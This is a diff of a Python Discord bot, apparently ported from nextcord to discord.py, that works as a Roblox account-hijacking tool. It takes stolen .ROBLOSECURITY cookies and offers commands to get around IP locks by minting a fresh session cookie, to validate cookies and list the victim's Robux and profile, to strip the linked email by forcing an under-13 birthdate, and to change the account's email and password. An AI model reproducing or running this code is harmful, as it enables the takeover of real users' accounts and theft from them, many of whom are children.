@@ -1,10 +1,9 @@
 import requests, json, re
 from datetime import datetime
-import nextcord  # Use nextcord instead of discord
-from nextcord import app_commands
+import discord, base64
+from discord import app_commands
 from threading import Thread
 from flask import Flask
-from nextcord.ext import commands
 from dotenv import load_dotenv
 import os
 
@@ -17,30 +16,33 @@ app = Flask(__name__)
 def home():
     return "Bot is alive!"
 
-# Get the Discord token from the environment variable
-DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
-PORT = 8080  # Define the port for the Flask server
+def run_flask():
+    app.run(host="0.0.0.0", port=8080)
 
-# Initialize the bot as a commands.Bot instance
-intents = nextcord.Intents.default()  # Use nextcord.Intents
-bot = commands.Bot(command_prefix="!", intents=intents)
+Thread(target=run_flask).start()
 
-# Define the Bypass class
+# Get the token from the environment variable
+TOKEN = os.getenv("DISCORD_TOKEN")
+
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+tree = app_commands.CommandTree(client)
+
+@client.event
+async def on_ready():
+    await tree.sync()
+    await client.change_presence(activity=discord.Streaming(name='Made by Micxzy', url='https://www.twitch.tv/UR_TWITCH_GOES_HERE'))
+    print(f"Logged in as {client.user.name} ({client.user.id})")
+
 class Bypass:
     def __init__(self, cookie: str) -> None:
         self.cookie = cookie
-
+    
     def start_process(self) -> str:
         self.xcsrf_token = self.get_csrf_token()
-        if "Error" in self.xcsrf_token:
-            return self.xcsrf_token
-
         self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
-        if "Error" in self.rbx_authentication_ticket:
-            return self.rbx_authentication_ticket
-
         return self.get_set_cookie()
-
+        
     def get_set_cookie(self) -> str:
         response = requests.post(
             "https://auth.roblox.com/v1/authentication-ticket/redeem",
@@ -49,25 +51,25 @@ class Bypass:
         )
         set_cookie_header = response.headers.get("set-cookie")
         if not set_cookie_header:
-            return "Error: Unable to retrieve set_cookie."
+            raise ValueError("An error occurred while getting the set_cookie")
         return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
 
     def get_rbx_authentication_ticket(self) -> str:
         response = requests.post(
             "https://auth.roblox.com/v1/authentication-ticket",
             headers={
-                "rbxauthenticationnegotiation": "1",
-                "referer": "https://www.roblox.com/camel",
-                "Content-Type": "application/json",
+                "rbxauthenticationnegotiation": "1", 
+                "referer": "https://www.roblox.com/camel", 
+                "Content-Type": "application/json", 
                 "x-csrf-token": self.xcsrf_token
             },
             cookies={".ROBLOSECURITY": self.cookie}
         )
         ticket = response.headers.get("rbx-authentication-ticket")
         if not ticket:
-            return "Error: Unable to retrieve authentication ticket."
+            raise ValueError("An error occurred while getting the rbx-authentication-ticket")
         return ticket
-
+        
     def get_csrf_token(self) -> str:
         response = requests.post(
             "https://auth.roblox.com/v2/logout", 
@@ -75,46 +77,23 @@ class Bypass:
         )
         xcsrf_token = response.headers.get("x-csrf-token")
         if not xcsrf_token:
-            return "Error: Invalid cookie. Sorry."
+            raise ValueError("An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie")
         return xcsrf_token
 
-# Existing bypass command
-@bot.tree.command(name="bypass", description="Bypass iplock using a cookie")
-@app_commands.describe(cookie="Enter the cookie you want to bypass with")
-async def bypass(interaction: nextcord.Interaction, cookie: str):
+@tree.command(name="bypass", description="Bypass the Roblox cookie")
+@app_commands.describe(cookie="Enter the cookie you want to bypass")
+async def bypass_cookie(interaction: discord.Interaction, cookie: str):
     await interaction.response.defer(ephemeral=True)
     try:
-        bypasser = Bypass(cookie)
-        result = bypasser.start_process()
-
-        embed = nextcord.Embed()
-        if "Error" in result:
-            embed.title = "Bypass Failed"
-            embed.description = result
-            embed.color = nextcord.Color.red()
-        else:
-            embed.title = "Iplockbypass Successful"
-            embed.description = f"{result}"
-            embed.color = nextcord.Color.green()
-
-        await interaction.followup.send(embed=embed)
+        bypass = Bypass(cookie)
+        new_cookie = bypass.start_process()
+        await interaction.followup.send(f"Successfully bypassed cookie:\n```{new_cookie}```")
     except Exception as e:
-        error_embed = nextcord.Embed(
-            title="Error",
-            description=str(e),
-            color=nextcord.Color.red()
-        )
-        await interaction.followup.send(embed=error_embed)
+        await interaction.followup.send(f"An error occurred: {str(e)}")
 
-@bot.event
-async def on_ready():
-    await bot.tree.sync()
-    await bot.change_presence(activity=nextcord.Streaming(name='Made by Saiki', url='https://www.twitch.tv/UR_TWITCH_GOES_HERE'))
-    print(f"Logged in as {bot.user.name} ({bot.user.id})")
-
-@bot.tree.command(name="checkcookie", description="Check roblox cookies")
+@tree.command(name="checkcookie", description="Check roblox cookies")
 @app_commands.describe(cookie="Enter the cookie you want to check")
-async def check_cookie(interaction: nextcord.Interaction, cookie: str):
+async def check_cookie(interaction: discord.Interaction, cookie: str):
     await interaction.response.defer(ephemeral=True)
 
     session = requests.Session()
@@ -187,16 +166,16 @@ async def check_cookie(interaction: nextcord.Interaction, cookie: str):
 
     pendingrobux = sum.get("pendingRobuxTotal", 0)
 
-    join_date = session .get(f"https://users.roblox.com/v1/users/{userid}").json()["created"]
+    join_date = session.get(f"https://users.roblox.com/v1/users/{userid}").json()["created"]
     dt = datetime.strptime(join_date, "%Y-%m-%dT%H:%M:%S.%fZ")
     date = dt.strftime("%Y-%m-%d %H:%M:%S")
 
     followers = session.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count").json()["count"]
     friends = session.get(f"https://friends.roblox.com/v1/users/{userid}/friends/count").json()["count"]
 
-    cook = nextcord.Embed(title=f'**Yey A Valid Cookie 🍪**', color=0x42be8f)
+    cook = discord.Embed(title=f'**Yey A Valid Cookie 🍪**', color=0x42be8f)
     cook.set_thumbnail(url=f'{avatarurl}')
-    cook.add_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid}/profile)**', inline=False)
+    cook.add_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid }/profile)**', inline=False)
     cook.add_field(name="Username👀:", value=f'```{username}```', inline=True)
     cook.add_field(name="User ID:🔍", value=f'```{userid}```', inline=True)
     cook.add_field(name="Display Name👀:", value=f'```{displayname}```', inline=True)
@@ -214,10 +193,10 @@ async def check_cookie(interaction: nextcord.Interaction, cookie: str):
 
     await interaction.followup.send(embed=cook)
 
-@bot.tree.command(name="force_13", description="Remove User's connected email")
+@tree.command(name="force_13", description="Remove User's connected email")
 @app_commands.describe(cookie="enter your target cookie")
 @app_commands.describe(password="enter your account password")
-async def force_13plus(interaction: nextcord.Interaction, cookie: str, password: str):
+async def force_13plus(interaction: discord.Interaction, cookie: str, password: str):
     await interaction.response.defer(ephemeral=True)
     session = requests.Session()
     def get_xcsrf(cookie):
@@ -254,7 +233,7 @@ async def force_13plus(interaction: nextcord.Interaction, cookie: str, password:
                     })
     challengeid = res1.headers.get("Rblx-Challenge-Id")
 
-    tokenres = session.post("https://apis.roblox.com/reauthentication_service/v1/token/generate",
+    tokenres = session.post("https://apis.roblox.com/reauthentication-service/v1/token/generate",
                         json={
                             "password": password
                         })
@@ -266,11 +245,11 @@ async def force_13plus(interaction: nextcord.Interaction, cookie: str, password:
 
     continueres = session.post("https://apis.roblox.com/challenge/v1/continue",
                            json={
- "challengeId": challengeid,
+                               "challengeId": challengeid,
                                "challengeMetadata": json.dumps({"reauthenticationToken": token}),
                                "challengeType": "reauthentication"
                            })
-    if continueres.status_code != 200:
+    if continueres.status_code!= 200:
         await interaction.followup.send(f"Please check your password.")
         return
     session.headers["Rblx-Challenge-Id"] = challengeid
@@ -279,21 +258,21 @@ async def force_13plus(interaction: nextcord.Interaction, cookie: str, password:
 
     res69 = session.post("https://users.roblox.com/v1/birthdate", 
                     json={
-                        "birthMonth": 2,
-                        "birthDay": 9,
-                        "birthYear": 2013
+                        "birthMonth":2,
+                        "birthDay":9,
+                        "birthYear":2013
                     })
-    if res69.status_code != 200:
+    if res69 .status_code != 200:
         await interaction.followup.send(f"Failed to change birthday. Please try again.")
         return
     
     await interaction.followup.send(f"Successfully removed connected email.")
 
-@bot.tree.command(name="change_email", description="Change the email address")
+@tree.command(name="change_email", description="Change the email address")
 @app_commands.describe(cookie="enter your target cookie")
 @app_commands.describe(new_email="enter your new email")
 @app_commands.describe(password="Enter your password")
-async def change_email(interaction: nextcord.Interaction, cookie: str, new_email: str, password: str):
+async def change_email(interaction: discord.Interaction, cookie: str, new_email: str, password: str):
     await interaction.response.defer(ephemeral=True)
     session = requests.Session()
     def get_xcsrf(cookie):
@@ -333,11 +312,11 @@ async def change_email(interaction: nextcord.Interaction, cookie: str, new_email
     
     await interaction.followup.send(f"Successfully changed email address.")
 
-@bot.tree.command(name="change_password", description="Change password")
+@tree.command(name="change_password", description="Change password")
 @app_commands.describe(cookie="enter your target cookie")
 @app_commands.describe(old_password="enter your old password")
 @app_commands.describe(new_password="enter your new password")
-async def change_password(interaction: nextcord.Interaction, cookie: str, old_password: str, new_password: str):
+async def change_password(interaction: discord.Interaction, cookie: str, old_password: str, new_password: str):
     await interaction.response.defer(ephemeral=True)
     session = requests.Session()
     def get_xcsrf(cookie):
@@ -365,17 +344,17 @@ async def change_password(interaction: nextcord.Interaction, cookie: str, old_pa
     res1 = session.post("https://auth.roblox.com/v2/user/passwords/change", json={
         "currentPassword": old_password,
         "newPassword": new_password
- })
+    })
     if res1.status_code != 200:
         await interaction.followup.send(f"Failed to change password. Please check your old password and try again.")
         return
     
     await interaction.followup.send(f"Successfully changed password.")
 
-@bot.tree.command(name="help", description="show all available commands.")
-async def help_command(interaction: nextcord.Interaction):
+@tree.command(name="help", description="show all available commands.")
+async def help_command(interaction: discord.Interaction):
     await interaction.response.send_message(
-        embed=nextcord.Embed(
+        embed=discord.Embed(
             title="Help",
             description="Here are all available commands:",
             color=0x2a2a2a
@@ -391,25 +370,19 @@ async def help_command(interaction: nextcord.Interaction):
             name="/change_email",
             value="Change email address",
             inline=False
-        ).add_field(
+ ).add_field(
             name="/change_password",
             value="Change password",
+            inline=False
+        ).add_field(
+            name="/bypass",
+            value="Bypass the Roblox cookie",
             inline=False
         ).add_field(
             name="/help",
             value="Show all available commands",
             inline=False
-        ).add_field(
-            name="/bypass",
-            value="Bypass iplock using a cookie",
-            inline=False
         )
     )
 
-# Start Flask server and bot together
-if __name__ == "__main__":
-    # Start Flask server in a separate thread
-    Thread(target=lambda: app.run(host="0.0.0.0", port=PORT)).start()
-    
-    # Run the bot
-    bot.run(DISCORD_TOKEN)
+client.run(TOKEN)
